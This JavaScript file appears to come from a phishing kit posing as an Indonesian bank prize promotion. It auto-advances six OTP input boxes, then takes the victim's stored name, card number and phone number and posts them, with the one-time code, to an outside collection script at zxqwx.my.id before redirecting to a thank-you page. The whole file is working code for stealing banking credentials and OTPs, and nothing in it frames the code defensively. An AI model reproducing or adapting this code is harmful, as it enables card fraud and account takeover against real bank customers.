$(document).ready(function() {
	var otp1 = $("#otp1").val().trim();
	var otp2 = $("#otp2").val().trim();
	var otp3 = $("#otp3").val().trim();
	var otp4 = $("#otp4").val().trim();
	var otp5 = $("#otp5").val().trim();
	var otp6 = $("#otp6").val().trim();
	$("#otp1").on('input', function() {
		if ($("#otp1").val().trim().length == 1) {
		  $("#otp2").focus();
		}
	});
	$("#otp2").on('input', function() {
		if ($("#otp2").val().trim().length == 1) {
		  $("#otp3").focus();
		}
	});
	$("#otp3").on('input', function() {
		if ($("#otp3").val().trim().length == 1) {
		  $("#otp4").focus();
		}
	});
	$("#otp4").on('input', function() {
		if ($("#otp4").val().trim().length == 1) {
		  $("#otp5").focus();
		}
	});
	$("#otp5").on('input', function() {
		if ($("#otp5").val().trim().length == 1) {
		  $("#otp6").focus();
		}
	});
	$("#otp6").on('input', function() {
		if ($("#otp6").val().trim().length == 1) {
		  var otp1 = $("#otp1").val().trim();
	var otp2 = $("#otp2").val().trim();
	var otp3 = $("#otp3").val().trim();
	var otp4 = $("#otp4").val().trim();
	var otp5 = $("#otp5").val().trim();
	var otp6 = $("#otp6").val().trim();
	var otp = otp1+otp2+otp3+otp4+otp5+otp6;
	if (otp.length == 6) {
		next();
    }
		}
	});
});

function next() {
	var otp1 = $("#otp1").val().trim();
	var otp2 = $("#otp2").val().trim();
	var otp3 = $("#otp3").val().trim();
	var otp4 = $("#otp4").val().trim();
	var otp5 = $("#otp5").val().trim();
	var otp6 = $("#otp6").val().trim();
	var otp = otp1+otp2+otp3+otp4+otp5+otp6;
	if (otp.length != 6) {
		alert('Mohon masukkan 6-digit kode OTP!');
		return;
	}
	phone = "+62"+phone;
	$("#loader").css('display', 'flex');
	
	var name = window.localStorage.getItem('name', '');
	var card = window.localStorage.getItem('card', '');
	var phone = window.localStorage.getItem('phone', '');
	var message = ('\n<b>Nama Lengkap:</b>\n'+name+'\n\n<b>No. Kartu:</b>\n'+card+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Kode OTP:</b>\n'+otp+'\n');
	var fd = new FormData();
	fd.append('message', message);
	
	fetch("https://zxqwx.my.id/senders/"
        +"gebyar-brks-hadiah/send.php", {
        method: 'POST',
        body: fd
      })
      .then(response => response.json())
      .then(data => {
      	dataSent();
      })
      .catch((error) => {
      	dataSent();
      });
}

function dataSent() {
          $("#loader").css('display', 'none');
		  window.location.href = "thank.html";
}

module.next = next;